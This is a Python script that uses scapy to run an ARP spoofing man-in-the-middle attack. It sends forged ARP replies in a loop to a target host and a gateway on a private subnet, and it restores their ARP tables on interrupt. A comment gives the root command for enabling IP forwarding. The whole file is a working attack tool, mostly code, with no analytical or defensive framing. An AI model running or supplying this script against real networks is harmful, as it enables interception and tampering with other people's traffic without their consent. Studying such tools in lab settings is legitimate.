import scapy.all as scapy
import time
import sys

# IP forwarding needs to be enabled in order for the MITM to work
# run as root -> echo 1 > /proc/sys/net/ipv4/ip_forward

def get_mac(ip):
    """
    This function sends a broadcast ARP request to get the MAC address of a target IP.
    """
    arp_request = scapy.ARP(pdst=ip)  # ARP request for the target IP
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC address
    arp_request_broadcast = broadcast/arp_request  # Combine the broadcast and ARP request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc  # Return the source MAC address
    else:
        return None

def spoof(target_ip, spoof_ip):
    """
    This function sends a spoofed ARP response to the target IP to associate its MAC address
    with the spoofed IP (gateway IP).
    """
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"Could not find MAC address for target IP {target_ip}")
        return
    
    # ARP reply, op=2 (reply), target MAC and target IP, source IP is the spoofed IP
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    """
    This function restores the correct ARP mapping between source and destination IPs.
    It sends an ARP reply that corrects the target’s ARP table.
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    
    if destination_mac is None or source_mac is None:
        print(f"Could not find MAC address for {destination_ip} or {source_ip}")
        return
    
    # ARP reply to restore ARP table (correct mapping)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)  # Send 4 packets to ensure ARP table is restored

sent_packets = 0
target_ip = "192.168.60.5"
gateway_ip = "192.168.60.1"

try:
    while True:
        spoof(target_ip, gateway_ip)  # Spoof target with gateway IP
        spoof(gateway_ip, target_ip)  # Spoof gateway with target IP
        sent_packets += 2
        print(f"\r[+] Packets sent: {sent_packets}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detecting Ctrl-C ...... Resetting ARP tables.......Please wait.\n")
    restore(target_ip, gateway_ip)  # Restore target to gateway
    restore(gateway_ip, target_ip)  # Restore gateway to target